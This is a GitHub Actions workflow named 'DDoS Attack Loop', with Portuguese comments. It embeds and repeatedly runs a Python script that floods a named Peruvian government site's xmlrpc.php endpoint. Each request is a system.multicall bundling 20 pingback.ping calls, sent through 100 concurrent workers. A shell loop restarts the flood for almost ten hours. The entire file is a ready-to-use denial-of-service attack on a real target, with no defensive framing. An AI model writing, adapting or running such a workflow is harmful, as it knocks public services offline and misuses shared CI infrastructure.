name: DDoS Attack Loop

on:
  workflow_dispatch:

jobs:
  attack:
    runs-on: ubuntu-latest
    timeout-minutes: 590 

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Install dependencies
        run: pip install aiohttp requests

      - name: Run Attack Script
        env:
          TARGET_URL: "https://ugelch.gob.pe/xmlrpc.php" 
          WORKERS: "100" 
          DURATION: "3600" 
        run: |
          echo "[!] Iniciando ataque massivo..."
          
          cat > code.py << 'EOF'
import asyncio
import aiohttp
import random
import string
import time
import os

TARGET = os.getenv("TARGET_URL", "https://ugelch.gob.pe/xmlrpc.php")
WORKERS = int(os.getenv("WORKERS", "100"))
DURATION = int(os.getenv("DURATION", "3600"))

def rand_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

async def xml_flood(session, semaphore, start_time):
    while time.time() - start_time < DURATION:
        async with semaphore:
            try:
                calls = []
                for _ in range(20):
                    calls.append(f"""<value><struct>
                        <member><name>methodName</name><value><string>pingback.ping</string></value></member>
                        <member><name>params</name><value><array><data>
                        <value><string>http://{rand_string(10)}.com/p={random.randint(1,999)}</string></value>
                        <value><string>http://{rand_string(10)}.com</string></value>
                        </data></array></value></member>
                    </struct></value>""")
                
                body = f"""<?xml version="1.0"?>
<methodCall>
<methodName>system.multicall</methodName>
<params><param><value><array><data>
{''.join(calls)}
</data></array></value></param></params>
</methodCall>"""

                headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'text/xml'}
                
                async with session.post(TARGET, data=body.encode(), headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    await resp.read() 
                    
            except Exception:
                pass

async def main():
    print(f"[!] Ataque Massivo iniciado em {TARGET}")
    print(f"[+] Workers: {WORKERS} | Duração: {DURATION}s")
    
    connector = aiohttp.TCPConnector(limit=WORKERS, force_close=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        semaphore = asyncio.Semaphore(WORKERS)
        tasks = [asyncio.create_task(xml_flood(session, semaphore, time.time())) for _ in range(WORKERS)]
        
        await asyncio.gather(*tasks)
        
    print("[+] Fim do ataque.")

if __name__ == "__main__":
    asyncio.run(main())
EOF

          # Loop contínuo para garantir que o ataque não pare se houver falha
          while true; do
            echo "$(date): Iniciando ciclo de ataque..."
            python3 code.py
            echo "$(date): Ciclo finalizado. Reiniciando em 5 segundos..."
            sleep 5
          done
